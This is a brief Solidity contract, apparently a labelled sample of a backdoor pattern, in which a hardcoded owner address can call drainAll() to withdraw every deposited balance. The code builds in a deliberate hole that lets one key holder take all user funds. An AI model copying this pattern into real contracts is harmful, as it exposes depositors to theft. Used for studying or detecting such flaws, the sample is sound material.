// Hardcoded owner address can always drain funds
contract HardcodedBackdoor {
    address constant private owner = 0x1234567890abcdef1234567890abcdef12345678;

    function drainAll() external {
        require(msg.sender == owner, "Not authorized");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
